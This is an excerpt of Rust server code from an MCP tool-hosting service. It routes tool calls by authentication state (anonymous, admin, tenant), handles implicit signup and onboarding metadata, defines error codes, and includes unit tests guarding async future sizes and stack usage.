            // call as that tenant, so the caller's first useful call just
            // works instead of failing `tenant_key_missing` (requirement 4).
            // Checked after every exempted name above (`signup`,
            // `host.quickstart`, `billing.plans`, `host.redeem`, all
            // matched regardless of `auth`) and before the blanket
            // `tenant_key_missing` arm below, which stays the refusal for
            // every OTHER anonymous call (a non-`host.`/`billing.` name, or
            // `admin.*` -- Non-goal: "admin.* never implicit-signs-up").
            //
            // Requirement 4's own wording scopes this to "`host.*`/
            // `billing.*` on `/mcp`" specifically -- `tenant_path_namespace(parts)`
            // is `Some` only on a `/t/{ns}/mcp` request, which keeps its
            // pre-existing PRD-mcphost-tenant-resource-metadata contract
            // (a 401 challenge naming THAT tenant's own metadata, never an
            // implicit signup for a path that already names a specific,
            // real tenant). A `/u/{secret}/mcp` request never reaches this
            // arm at all: an unknown/invalid secret fails inside
            // `resolve_path_secret_auth` before this match runs, and a
            // valid one resolves straight to `Auth::Tenant`.
            (Auth::Anonymous, name)
                if via_tenant_key_arg
                    && (name.starts_with("host.") || name.starts_with("billing."))
                    && !crate::asks::NEVER_SIGNS_UP.contains(&alias_canonical.unwrap_or(name))
                    && tenant_path_namespace(parts).is_none() =>
            {
                let dispatch_name = alias_canonical.unwrap_or(name);
                self.implicit_signup_boxed(
                    &ctx,
                    parts,
                    &source,
                    session_id.as_deref(),
                    dispatch_name,
                    args,
                )
                .await
            }
            // PRD-mcphost-auth-error-names-argument requirement 1-3 /
            // AC1-4: three distinct auth failures now, not one. A header
            // was sent and didn't resolve (`!via_tenant_key_arg`) keeps the
            // original bearer-shaped text and its own `bearer_invalid`
            // code (AC4). No header at all falls through to the
            // `tenant_key` argument -- absent (or non-string) is
            // `tenant_key_missing` (AC1), present but unrecognized is
            // `tenant_key_invalid` (AC2/AC3, message never echoes the key).
            // Requirement 5 / AC6: the journal line carries the code and
            // the tool name -- never the key itself, which never appears
            // in `body_name` (the requested tool's name, not its
            // arguments).
            //
            // PRD-mcphost-implicit-signup requirement 4: no longer reachable
            // for a `host.*`/`billing.*` name on `/mcp` (the arm above wins
            // first) -- still the refusal for every other anonymous call.
            (Auth::Anonymous, _) if via_tenant_key_arg => {
                let err = AppError::TenantKeyMissing(crate::errors::Reason::Anonymous);
                tracing::warn!(code = err.code(), tool = %body_name, "host.* call refused: tenant_key missing");
                Err(err)
            }
            (Auth::Invalid, _) if via_tenant_key_arg => {
                let err = AppError::TenantKeyInvalid;
                tracing::warn!(code = err.code(), tool = %body_name, "host.* call refused: tenant_key invalid");
                Err(err)
            }
            (Auth::Anonymous | Auth::Invalid, _) => {
                let err = AppError::Unauthorized;
                tracing::warn!(code = err.code(), tool = %body_name, "call refused: missing or invalid Authorization header");
                Err(err)
            }
            (Auth::Admin, name) if name.starts_with("admin.") => {
                self.dispatch_admin_boxed(name, args).await
            }
            // PRD-mcphost-admin-schema-contract P2 requirement 7 (AC7): the
            // one host.* tool an admin-scoped caller (the admin key, not a
            // tenant) may reach directly -- so an operator already holding
            // the admin key can learn the admin schema version with no
            // extra tenant signup.
            (Auth::Admin, "host.whoami") => Ok(control::whoami_admin(&self.state)),
            // PRD-mcphost-call-trace-replay R5: the admin bearer may read any
            // tenant's trace.
            (Auth::Admin, "host.call_trace") => self.call_trace_admin_boxed(args).await,
            (Auth::Admin, "host.doctor") => self.doctor_admin_boxed(args).await,
            (Auth::Admin, "host.incidents.list") => crate::heal::incidents_list(&self.state, &args).await,
            (Auth::Admin, "host.help.gaps") => crate::help_search::gaps_call(&self.state.db, &args, now_unix()).await,
            (Auth::Admin, _) => Err(AppError::Forbidden),
            (Auth::Tenant(_, _), name) if name.starts_with("admin.") => {
                let _ = name;
                Err(AppError::Forbidden)
            }
            (Auth::Tenant(tenant, oauth_caller), name)
                if name.starts_with("host.") || name.starts_with("billing.") =>
            {
                let subject = oauth_caller.as_ref().map(|o| o.subject.as_str());
                // PRD-mcphost-hosted-authorization-server requirement 5:
                // `host.whoami`'s `auth_method` -- `"key"` for the
                // pre-existing header/`tenant_key`-argument paths (no
                // `OauthCaller` at all), else whichever this call's own
                // bearer resolved to (`"oauth"`/`"hosted_token"`).
                //
                // PRD-mcphost-url-bound-tenants requirement 3 (AC1): `"url"`
                // when this call resolved via its own `/u/{secret}/mcp`
                // path -- checked first, since `via_url_secret` implies
                // `oauth_caller == None` (same precedence `calls_auth_method`
                // below already encodes).
                let auth_method = if via_url_secret {
                    "url"
                } else {
                    oauth_caller.as_ref().map_or("key", |o| o.auth_method)
                };
                let calls_method = calls_auth_method(oauth_caller.as_ref(), via_session_binding, via_url_secret);
                // requirement 2: dispatch always sees the canonical name --
                // `alias_canonical` is `Some` iff `name` is a registered
                // alias of it.
                let dispatch_name = alias_canonical.unwrap_or(name);
                // PRD-mcphost-same-user-second-agent R2: the calling
                // client, for the verbs that act on "this" client.
                let call_client = if matches!(dispatch_name, "host.whoami" | "host.key.rotate" | "host.client.revoke") {
                    Some(
                        self.calling_client_id(parts, tenant, session_id.as_deref(), joined_client_id.as_deref())
                            .await
                            .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?,
                    )
                } else {
                    None
                };
                let call_scope = oauth_caller.as_ref().and_then(|o| o.scope.clone());
                let (result, prompts_changed) = self
                    .dispatch_tenant_scoped_boxed(
                        call_scope,
                        call_client,
                        tenant,
                        subject,
                        auth_method,
                        calls_method,
                        end_user.as_ref(),
                        session_id.as_deref(),
                        dispatch_name,
                        args,
                    )
                    .await;
                // PRD-mcphost-notes-to-future-self R3: a tool-attached note
                // put or deleted changes that tool's `tools/list` text.
                if let Ok(value) = &result
                    && crate::notes::changes_tool_list(dispatch_name, value)
                    && let Err(e) = crate::protocol::frames::emit(
                        &ctx.peer,
                        crate::protocol::frames::Frame::ToolListChanged,
                        crate::protocol::frames::request_type_of("tools/call", true),
                    )
                    .await
                {
                    tracing::warn!(tenant = %tenant.namespace, error = %e, "notify_tool_list_changed failed");
                }
                if prompts_changed {
                    Box::pin(notify_prompt_list_changed(&ctx.peer, &tenant.namespace)).await;
                }
                result
            }
            (Auth::Tenant(tenant, oauth_caller), name) => match name.split_once('.') {
                Some((ns, local)) if ns == tenant.namespace => {
                    let token_scope = oauth_caller.as_ref().and_then(|o| o.scope.as_deref());
                    self.call_own_published_boxed(
                        tenant,
                        local,
                        args,
                        mismatch,
                        end_user.as_ref(),
                        calls_auth_method(oauth_caller.as_ref(), via_session_binding, via_url_secret),
                        token_scope,
                    )
                    .await
                }
                // PRD-mcphost-sharing P0 requirement 2: `<ns>.<name>` for
                // another tenant's namespace no longer falls straight to
                // `ToolNotFound` -- it resolves through `call_shared_tool`,
                // which is the only place that decides whether `ns.local`'s
                // visibility lets `tenant` (the caller here) reach it.
                Some((ns, local)) => {
                    // PRD-mcphost-tool-versions requirement 5 (AC5): this
                    // wire `arguments` object IS the call's own args (there
                    // is no separate top-level slot the way host.tool_call
                    // has), so a pinning caller reserves `version` as a key
                    // inside it, stripped before schema validation/dispatch
                    // -- same "reserved key inside the call args" shape
                    // `tenant_key` already uses for the session-key path.
                    let (version, args) = match args {
                        Value::Object(mut map) => {
                            let version = map.remove("version").and_then(|v| v.as_i64());
                            (version, Value::Object(map))
                        }
                        other => (None, other),
                    };
                    self.call_shared_boxed(
                        tenant,
                        ns,
                        local,
                        args,
                        mismatch,
                        version,
                        end_user.as_ref(),
                        calls_auth_method(oauth_caller.as_ref(), via_session_binding, via_url_secret),
                    )
                    .await
                }
                None => Err(AppError::ToolNotFound(name.to_string())),
            },
            }
        };

        // PRD-mcphost-idempotency-key-on-call R6: a `tool_timeout` names the
        // key (or null) and the retry hint.
        let outcome = outcome.map_err(|e| crate::idempotency::annotate_timeout(e, idem_key.as_deref()));
        let outcome = outcome.map_err(|e| match &ran_tool {
            Some(tool) => e.with_tool(tool),
            None => e,
        });
        // PRD-mcphost-refusals-name-their-cause R4: a published-tool call that
        // finds nothing, on a connection whose own tenant implicit sign-up made
        // moments ago, says so. Reads the bound tenant row only.
        let outcome = outcome.map_err(|e| match &auth {
            Auth::Tenant(tenant, _)
                if !body_name.starts_with("host.")
                    && !body_name.starts_with("billing.")
                    && !body_name.starts_with("admin.") =>
            {
                e.on_implicit_tenant(&tenant.namespace, tenant.signup_source.as_deref(), tenant.created_unix, now_unix())
            }
            _ => e,
        });
        // PRD-mcphost-usage-in-every-response R2: `_meta.usage` is built BEFORE
        // the idempotency store captures the response, so a replay returns the
        // first response's usage verbatim (no replay-path query). A replay
        // carries the stored block; any other call reads what its own checks
        // observed.
        let result_usage_meta: Option<Value> = if outcome.is_err() {
            None
        } else if replayed_at.is_some() {
            replay_usage.take()
        } else if let Auth::Tenant(tenant, _) = &auth {
            crate::usage::result_usage(&self.state, tenant).await
        } else {
            None
        };
        if let Some(guard) = idem_guard.take() {
            guard.finish(&outcome, result_usage_meta.as_ref()).await;
        }
        match outcome {
            Ok(mut value) => {
                // PRD-mcphost-invite-links requirement 2 (AC2): this
                // call's own tenant was just created from the invite --
                // the response it was already going to carry (whatever
                // `host.tool.call`/other dispatch produced) also gets the
                // onboarding object.
                if let Some(onboarding) = invite_onboarding.take()
                    && let Some(obj) = value.as_object_mut()
                {
                    obj.insert("onboarding".to_string(), onboarding);
                }
                // PRD-mcphost-ownership-moment requirement 1 (AC1): a
                // URL-bound tenant's (`/u/new`'s own mint) first real MCP
                // call never carried an `onboarding` envelope at all before
                // this PRD -- `via_url_secret` and a `None` `last_seen_unix`
                // (loaded by `resolve_path_secret_auth` BEFORE it bumped the
                // column, same property `maybe_attach_welcome_back` already
                // relies on) together mean exactly "this tenant's first
                // authenticated call ever, and it arrived on its own
                // `/u/{secret}/mcp` link". Mutually exclusive with the
                // invite/implicit-signup onboarding above: an invite join
                // never sets `via_url_secret`, and implicit signup's own
                // `auth` stays `Auth::Anonymous` throughout.
                else if via_url_secret
                    && let Auth::Tenant(tenant, _) = &auth
                    && tenant.last_seen_unix.is_none()
                    && let Some(obj) = value.as_object_mut()
                {
                    obj.insert(
                        "onboarding".to_string(),
                        json!({
                            "tenant": tenant.namespace,
                            "claim_url": crate::claim::claim_url_for_tenant(&self.state.public_url, tenant),
                        }),
                    );
                }
                // PRD-mcphost-oauth-first-grant-signup requirement 4: the
                // first authenticated call on a grant whose tenant consent
                // itself created (`source: "oauth"`, no earlier call --
                // `last_seen_unix` is read before this call bumps it) carries
                // the same `onboarding` envelope implicit signup sends.
                else if let Auth::Tenant(tenant, Some(_)) = &auth
                    && tenant.signup_source.as_deref() == Some("oauth")
                    && tenant.last_seen_unix.is_none()
                    && let Some(obj) = value.as_object_mut()
                {
                    let onboarding = self
                        .first_grant_onboarding(tenant)
                        .await
                        .map_err(|e| e.into_error_data_at(Some(&self.state.public_url)))?;
                    obj.insert("onboarding".to_string(), onboarding);
                }
                if !deprecation_notices.is_empty()
                    && let Some(obj) = value.as_object_mut()
                {
                    crate::envelope::stamp_deprecations(obj, json!(deprecation_notices));
                }
                // PRD-mcphost-one-next-tool requirement 4 (AC4, AC5),
                // requirement 5 (AC6, AC7): `maybe_attach_next_hint` itself
                // is a no-op for anything but a `host.*` name, so this is
                // safe to call unconditionally for every `Auth::Tenant`
                // success, including a namespaced/shared-tool call and
                // `billing.*` (requirement 8).
                // PRD-mcphost-ownership-moment requirement 2 (AC2): the one
                // "hand this claim link to your human" nudge, computed here
                // (where the dispatched tool name and tenant are both in
                // hand) but inserted into the response's real wire `_meta`
                // below, alongside `deprecated`/`invite_url` -- a distinct
                // channel from `maybe_attach_next_hint`'s own `next` field
                // on `value` itself, so the two can never collide on the
                // same `host.tool_publish` call.
                let mut claim_nudge: Option<Value> = None;
                // PRD-mcphost-kind-ask-routing requirement 5 (AC6): a
                // `host.quickstart {kind: <outcome>}` recipe is a
                // did_you_mean hit too.
                if let Auth::Tenant(tenant, _) = &auth
                    && value.get("verdict").and_then(Value::as_str) == Some("recipe")
                    && let Some(outcome) = value.get("outcome").and_then(Value::as_str)
                {
                    self.record_did_you_mean(tenant, &body_name, outcome).await;
                }
                if let Auth::Tenant(tenant, _) = &auth {
                    self.maybe_attach_next_hint(tenant, !via_tenant_key_arg, &body_name, &mut value)
                        .await;
                    // PRD-mcphost-first-call-gift requirement 4 (AC3, AC4):
                    // checked after `maybe_attach_next_hint` -- distinct
                    // keys on the same `value` object, so order doesn't
                    // matter between them.
                    self.maybe_attach_welcome_back(
                        tenant,
                        via_session_binding,
                        via_url_secret,
                        session_id.as_deref(),
                        &body_name,
                        &mut value,
                    )
                    .await;
                    // requirement 2 (AC2): "first successful host.tool_publish"
                    // -- gated on `origin` being `external` or `unattributed`
                    // (never fleet, never synthetic: a claim link is what turns
                    // an unattributed tenant into an external one) and `owner_verified_at` still null;
                    // `mark_claim_nudged_if_unset`'s own atomic `UPDATE ...
                    // WHERE claim_nudged_unix IS NULL` is what makes this
                    // "exactly once ever", not just "once per call".
                    if (body_name == "host.tool_publish" || body_name == "host.tool.publish")
                        && tenant.owner_verified_at.is_none()
                        && matches!(tenant.origin.as_str(), "external" | "unattributed")
                        && self
                            .state
                            .db
                            .mark_claim_nudged_if_unset(tenant.id, now_unix())
                            .await
                            .unwrap_or(false)
                        && let Some(url) = crate::claim::claim_url_for_tenant(&self.state.public_url, tenant)
                    {
                        claim_nudge = Some(json!({
                            "kind": "claim",
                            "url": url,
                            "text": format!("hand this claim link to your human: {url}"),
                        }));
                    }
                }
                // PRD-mcphost-tool-naming-convention-and-aliases
                // requirement 6 (P1, AC7): `host.whoami`'s first answer in
                // a session carries `naming_rule_url`; every later one in
                // the same session doesn't. Keyed on the transport's own
                // session id (present regardless of auth state), not the
                // tenant -- an anonymous probe before signup still only
                // ever sees it once.
                if body_name == "host.whoami" {
                    let show = match session_id.as_deref() {
                        Some(sid) => crate::tool_aliases::mark_whoami_hint_shown(sid),
                        None => true,
                    };
                    if show && let Some(obj) = value.as_object_mut() {
                        obj.insert(
                            "naming_rule_url".to_string(),
                            json!(crate::tool_aliases::naming_rule_url()),
                        );
                    }
                }
                crate::tool_aliases::record_call(&body_name);
                // PRD-mcphost-paged-trait-on-every-list-verb requirement 7:
                // a clamped `limit` rides out as `_meta.mcphost.limit_clamped`.
                let limit_clamped = crate::paged::take_clamp(&mut value);
                let deprecated_arg = crate::paged::take_deprecated_arg(&mut value);
                let resources_used = value.as_object_mut().and_then(|obj| obj.remove(RESOURCES_USED_KEY));
                let result = crate::output_schemas::success_result(value);
                // requirement 2: an alias call's response carries the
                // deprecation hint in `_meta.deprecated` (the MCP field
                // this protocol gives a tool result for exactly this,
                // per the open question this PRD resolved at build:
                // "deprecation hint goes ... to `tools/list` + logs" when
                // `_meta` doesn't survive a client, but it's always set
                // here regardless -- a client that drops `_meta` simply
                // never sees it, same as any other `_meta` extension),
                // plus one `tool_deprecated_alias` log line per tenant
                // per day (`Auth::Tenant` only -- `Auth::Admin` never
                // reaches a `host.*` alias; see the admin-only `host.whoami`
                // arm above).
                // PRD-mcphost-invite-links requirement 14 (AC13): once per
                // session, an invitee's successful cross-tenant
                // shared-tool call carries its own standing invite_url in
                // `_meta`, so an agent relaying results to another agent
                // has the link in hand without a second call.
                // `invite_hints.mark_first` is checked (not just
                // computed) here, inside the success arm, so a call that
                // fails dispatch never consumes the once-per-session slot.
                let invite_hint_url: Option<String> = if shared_tool_call_owner_ns.is_some()
                    && let Auth::Tenant(tenant, _) = &auth
                    && tenant.invited_by_tenant_id.is_some()
                    && session_id.as_deref().is_some_and(|sid| self.state.invite_hints.mark_first(sid))
                {
                    match self.state.db.find_standing_invite_for_tenant(tenant.id).await {
                        Ok(Some(invite)) => {
                            invite.code_plain.map(|code| crate::invites::invite_url(&self.state, &code))
                        }
                        _ => None,
                    }
                } else {
                    None
                };
                let mut meta = rmcp::model::MetaObject::new();
                if let (Some(canonical), Auth::Tenant(tenant, _)) = (alias_canonical, &auth) {
                    crate::tool_aliases::maybe_log_deprecated_alias(
                        tenant.id,
                        &tenant.key_hash,
                        &body_name,
                        canonical,
                        &crate::state::date_from_unix(now_unix()),
                    );
                    meta.0.insert(
                        "deprecated".to_string(),
                        json!({
                            "replaced_by": canonical,
                            "sunset": crate::tool_aliases::SUNSET_DATE,
                        }),
                    );
                }
                // PRD-mcphost-fields-projection-on-list-verbs R6: a deprecated
                // argument (`host.runs.list include_result`) rides in
                // `_meta.deprecated`, merged into an alias notice if there is one.
                if let Some(dep) = deprecated_arg {
                    match meta.0.get_mut("deprecated").and_then(Value::as_object_mut) {
                        Some(existing) => {
                            existing.insert("argument".to_string(), dep["argument"].clone());
                            existing.insert("argument_replaced_by".to_string(), dep["replaced_by"].clone());
                        }
                        None => {
                            meta.0.insert("deprecated".to_string(), dep);
                        }
                    }
                }
                if let Some(url) = invite_hint_url {
                    meta.0.insert("invite_url".to_string(), json!(url));
                }
                // PRD-mcphost-secret-non-exfiltration-proof R3: unbound
                // secrets this call sent upstream, so the agent can bind them.
                let unbound_sent = crate::leakguard::take_unbound_sent();
                if !unbound_sent.is_empty() {
                    meta.0.insert("unbound_secret_sent".to_string(), json!(unbound_sent));
                }
                // PRD-mcphost-delegation-bound-to-run-or-session AC1: the
                // connection's own id, so a lead can see what `bind:
                // {session: "current"}` would tie a key to.
                if body_name == "host.whoami"
                    && let Some(sid) = session_id.as_deref()
                {
                    meta.0.insert("session_id".to_string(), json!(sid));
                }
                if let Some(nudge) = claim_nudge {
                    meta.0.insert("next".to_string(), nudge);
                }
                if let Some(clamped) = limit_clamped {
                    meta.0.insert("mcphost".to_string(), json!({"limit_clamped": clamped}));
                }
                // PRD-mcphost-sandbox-resource-limits-from-plan R4/R5/R7.
                if let Some(used) = resources_used {
                    meta.0.insert("resources_used".to_string(), used);
                }
                if let Some(first_seen) = replayed_at {
                    meta.0.insert("replayed".to_string(), json!(true));
                    meta.0.insert("first_seen_unix".to_string(), json!(first_seen));
                }
                // PRD-mcphost-usage-in-every-response R2: the count the call's
                // own `calls_per_day` check read, plus the row it just wrote.
                if let Some(usage) = result_usage_meta {
                    meta.0.insert("usage".to_string(), usage);
                }
                let result = if meta.0.is_empty() { result } else { result.with_meta(Some(meta)) };
                Ok(CallToolResponse::from(result))
            }
            Err(app_err) => {
                // PRD-mcphost-kind-ask-routing requirement 5 (AC6): the
                // `unknown_kind` error carried a `did_you_mean` outcome.
                if let AppError::UnknownKind { requested, .. } = &app_err
                    && let Auth::Tenant(tenant, _) = &auth
                    && let Some(outcome) = crate::kinds::outcomes::find(requested)
                {
                    self.record_did_you_mean(tenant, &body_name, outcome.outcome).await;
                }
                // PRD-mcphost-docs-telemetry-failed-after-search R3: a keyed
                // tenant's failed call joins its newest unjoined search of
                // the last 120 s. Detached, so the error path pays only the
                // spawn, never the write.
                if let Auth::Tenant(tenant, _) = &auth
                    && body_name != "host.help.search"
                {
                    crate::help_search::note_failure(&self.state, tenant.id, app_err.code(), &body_name);
                }
                Err(app_err.into_error_data_attempt(Some(&self.state.public_url), attempt))
            }
        }
        }))
        .await;
        result
    }
}

/// PRD-mcphost-tool-test-examples-from-schema R2 (AC4): the generated example
/// for `schema`, or an `example_unavailable` refusal naming the failing path.
fn example_or_refusal(schema: &Value) -> Result<crate::kinds::example::Example, AppError> {
    crate::kinds::example::checked_example(schema).map_err(|e| AppError::Structured {
        code: EXAMPLE_UNAVAILABLE,
        message: format!(
            "no example could be generated from this tool's args_schema: {} at {}; pass `args` explicitly",
            e.message,
            if e.path.is_empty() { "/" } else { &e.path }
        ),
        data: json!({"path": e.path, "reason": e.message}),
    })
}

/// R3/R7: report the example that ran, the keys it had no type for, and (only
/// when there are any) a hint for fixing that.
fn add_example_fields(map: &mut serde_json::Map<String, Value>, ex: &crate::kinds::example::Example) {
    map.insert("example_args".to_string(), ex.args.clone());
    map.insert("untyped".to_string(), json!(ex.untyped));
    if !ex.untyped.is_empty() {
        map.insert(
            "schema_hint".to_string(),
            json!(format!("add defaults to untyped keys: {}", ex.untyped.join(", "))),
        );
    }
}

crate::err_code! {
    pub CONCURRENCY_EXCEEDED,
    code: "concurrency_exceeded", family: Plan, class: PlanLimit, retryable: true,
    remedy: "Wait for in-flight calls to finish and retry; data.plan names the concurrency ceiling.",
}

crate::err_code! {
    pub DRAFT_TEST_FAILED,
    code: "draft_test_failed", family: Call, class: AgentFault, retryable: false,
    remedy: "Read data for the failing draft test and adjust the request.",
}

crate::err_code! {
    pub DRAFT_UNAVAILABLE,
    code: "draft_unavailable", family: Internal, class: HostRefusal, retryable: false,
    remedy: "This host has no draft model configured; build the spec by hand from host.quickstart.",
}

crate::err_code! {
    pub END_USER_REVOKED,
    code: "end_user_revoked", family: Auth, class: HostRefusal, retryable: false,
    remedy: "This end user was revoked; do not retry with that subject.",
}

crate::err_code! {
    pub EXAMPLE_UNAVAILABLE,
    code: "example_unavailable", family: Spec, class: AgentFault, retryable: false,
    remedy: "Pass args explicitly; no example could be generated from args_schema.",
}

crate::err_code! {
    pub FIXTURES_NOT_APPLICABLE,
    code: "fixtures_not_applicable", family: Spec, class: AgentFault, retryable: false,
    remedy: "Fixtures apply to chain tools only; drop them for other kinds.",
}

crate::err_code! {
    pub FIXTURES_TOO_LARGE,
    code: "fixtures_too_large", family: Plan, class: PlanLimit, retryable: false,
    remedy: "Reduce the fixtures to data.limit_bytes in total.",
}

crate::err_code! {
    pub INTERRUPTED,
    code: "interrupted", family: Internal, class: HostFault, retryable: true,
    remedy: "The server restarted before this call finished; retry the same call (data.restart_id names the restart).",
}

crate::err_code! {
    pub PLAN_LIMIT,
    code: "plan_limit", family: Plan, class: PlanLimit, retryable: false,
    remedy: "Wait for the daily limit to reset or move to a plan with a higher limit.",
}

crate::err_code! {
    pub REPLAY_NEEDS_SECRET,
    code: "replay_needs_secret", family: Call, class: AgentFault, retryable: false,
    remedy: "Pass the full replay.args; the recorded request was too large to keep.",
}

crate::err_code! {
    pub TOO_MANY_INVOCATIONS,
    code: "too_many_invocations", family: Args, class: AgentFault, retryable: false,
    remedy: "Send at most data.limit invocations per call.",
}

crate::err_code! {
    pub TOOL_EXCEPTION,
    code: "tool_exception", family: Call, class: AgentFault, retryable: false,
    remedy: "Read data.exception_class and data.line, fix the tool's code, republish and re-run host.tool_test.",
}

crate::err_code! {
    pub TRACE_NOT_FOUND,
    code: "trace_not_found", family: Storage, class: AgentFault, retryable: false,
    remedy: "Use a call_id from a recent call; traces expire.",
}

crate::err_code! {
    pub UNTESTED_TOOL_CANNOT_BE_PUBLIC,
    code: "untested_tool_cannot_be_public", family: Publish, class: AgentFault, retryable: false,
    remedy: "Read data.verdict and data.detail, fix the tool, pass host.tool_test (data.next) for its current version, then set visibility public again.",
}

crate::err_code! {
    pub UNVERIFIABLE,
    code: "unverifiable", family: Call, class: AgentFault, retryable: false,
    remedy: "Call data.call_instead for real; no dry run exists for this verb.",
}


#[cfg(test)]
mod host_tools_stack_tests {
    use super::*;

    /// Size of the future an `async fn`-shaped closure returns, without
    /// building a handler/context or polling anything: only the type is read.
    fn future_size<'a, A, B, Fut: std::future::Future>(_f: impl FnOnce(&'a McpHostHandler, A, B) -> Fut) -> usize {
        std::mem::size_of::<Fut>()
    }

    fn future_size_dispatch<'a, Fut: std::future::Future>(
        _f: impl FnOnce(&'a McpHostHandler, &'a Tenant, &'a str, Value) -> Fut,
    ) -> usize {
        std::mem::size_of::<Fut>()
    }

    /// Debug-build future sizes of the dotted-verb forwarding chain stay under
    /// their stated bounds (verbfwd_ac01 debug stack overflow, 10-17). The
    /// types are measured without constructing or polling a future.
    #[cfg(debug_assertions)]
    #[test]
    fn future_sizes_stay_under_their_bounds() {
        let call_tool_inner = future_size(|h: &McpHostHandler, req: CallToolRequestParams, ctx: RequestContext<RoleServer>| {
            h.call_tool_inner(req, ctx)
        });
        let dispatch = future_size_dispatch(|h: &McpHostHandler, t: &Tenant, name: &str, args: Value| {
            h.dispatch_tenant_tool(t, None, "key", "key", None, None, name, args)
        });
        eprintln!("future sizes: call_tool_inner={call_tool_inner} dispatch_tenant_tool={dispatch}");
        assert!(
            call_tool_inner <= CALL_TOOL_INNER_FUTURE_MAX_BYTES,
            "McpHostHandler::call_tool_inner future is {call_tool_inner} bytes, bound is {CALL_TOOL_INNER_FUTURE_MAX_BYTES} \
             (verbfwd_ac01 stack overflow guard): box the newly added awaits in their own async fn"
        );
        assert!(
            dispatch <= DISPATCH_TENANT_TOOL_FUTURE_MAX_BYTES,
            "McpHostHandler::dispatch_tenant_tool future is {dispatch} bytes, bound is {DISPATCH_TENANT_TOOL_FUTURE_MAX_BYTES} \
             (verbfwd_ac01 stack overflow guard): box the newly added awaits in their own async fn"
        );
    }

    /// verbfwd_ac01 overflowed CI's 2 MiB test-thread stack (SIGABRT). Not a
    /// recursion: `host.trigger.set` -> `known_control_plane_args` ->
    /// `host_tools` runs at the bottom of the already-deep forwarded
    /// `host.tool_call` async chain (~1.8 MiB in a debug build), and
    /// `host_tools` was one ~275 KB debug frame. Build the descriptor table
    /// (the exact call `known_control_plane_args` makes) on a stack far below
    /// that frame's old size so it cannot grow back into one.
    #[test]
    fn known_control_plane_args_fits_a_small_stack() {
        const STACK: usize = 128 * 1024;
        let args = std::thread::Builder::new()
            .stack_size(STACK)
            .spawn(|| known_control_plane_args("host.trigger.set", &KindRegistry::with_builtin()))
            .expect("spawn")
            .join()
            .expect("known_control_plane_args overflowed a 128 KiB stack");
        let Some(args) = args else {
            panic!("host.trigger.set is a control-plane tool");
        };
        assert!(args.iter().any(|a| a == "tool"), "host.trigger.set args: {args:?}");
    }

    /// `dispatch_tenant_tool` routes `FORWARDING_WRAPPERS` past
    /// `dispatch_tenant_tool_dry_run`, which is only equivalent while none of them
    /// is a write verb (the only thing that function acts on). Route one through
    /// it by registering it as a write verb and this fails, naming the wrapper.
    #[test]
    fn wrappers_are_not_write_verbs() {
        for wrapper in FORWARDING_WRAPPERS {
            assert!(
                crate::write_verbs::lookup(wrapper).is_none(),
                "{wrapper} is a write verb: dispatch_tenant_tool must not skip dispatch_tenant_tool_dry_run for it"
            );
        }
    }
}
